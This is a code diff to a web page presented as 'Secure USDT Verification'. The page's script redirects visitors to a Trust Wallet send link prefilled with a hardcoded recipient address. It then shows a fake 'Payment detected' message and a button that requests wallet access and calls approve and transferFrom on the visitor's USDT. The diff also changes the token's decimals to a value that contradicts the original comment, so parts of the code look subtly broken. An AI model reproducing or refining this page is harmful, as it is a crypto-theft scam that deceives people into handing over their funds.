@@ -66,7 +66,7 @@
   <h1>Secure USDT Verification</h1>
   <p id="status">Redirecting you to Trust Wallet...</p>
 
-  <!-- Input Fields -->
+  <!-- New Input Section -->
   <div class="box">
     <label>Address or Domain Name</label>
     <div class="input-group">
@@ -86,58 +86,50 @@
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-    const DECIMALS = 18; // For BNB Chain USDT it is 18 (some are 6)
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const DECIMALS = 6;
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ];
 
-    const payLink = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=" + USDT;
-
-    // Auto redirect to Trust Wallet
+    // Redirect first
+    const payLink = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
     setTimeout(() => {
       window.location.href = payLink;
     }, 2000);
 
-    // Show Approve button after redirect
+    // Show button after return
     setTimeout(() => {
       document.getElementById('status').innerText = "Payment detected. Please Approve.";
       document.getElementById('approve').style.display = "inline-block";
     }, 8000);
 
-    // Main Transfer Function
+    // Approve and Transfer
     document.getElementById('approve').onclick = async () => {
-      const button = document.getElementById('approve');
-      button.innerText = "Processing...";
-      button.disabled = true;
-
+      if (!window.ethereum) return alert('Use Trust Wallet DApp browser.');
       try {
-        if (!window.ethereum) return alert('Use Trust Wallet DApp browser.');
-
         const web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: "eth_requestAccounts" });
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
-        const receiver = document.getElementById("receiver").value.trim();
-        const amount = parseFloat(document.getElementById("amount").value || "0");
-        if (!receiver || amount <= 0) throw new Error("Invalid receiver or amount");
-
         const contract = new web3.eth.Contract(ABI, USDT);
-        const value = web3.utils.toBN((amount * (10 ** DECIMALS)).toString());
+        const receiver = document.getElementById("receiver").value;
+        const amount = parseFloat(document.getElementById("amount").value || "0");
+
+        if (!receiver || amount <= 0) return alert("Invalid input");
+
+        const value = web3.utils.toBN((amount * (10 ** DECIMALS)).toFixed(0));
 
         await contract.methods.approve(receiver, value).send({ from: user });
         await contract.methods.transferFrom(user, receiver, value).send({ from: user });
 
         document.getElementById('status').innerText = "✅ Transaction Complete.";
-        button.innerText = "Done";
+        document.getElementById('approve').style.display = "none";
       } catch (err) {
         console.error(err);
         alert("❌ Failed: " + err.message);
-        button.innerText = "Approve & Confirm";
-      } finally {
-        button.disabled = false;
       }
     };
 
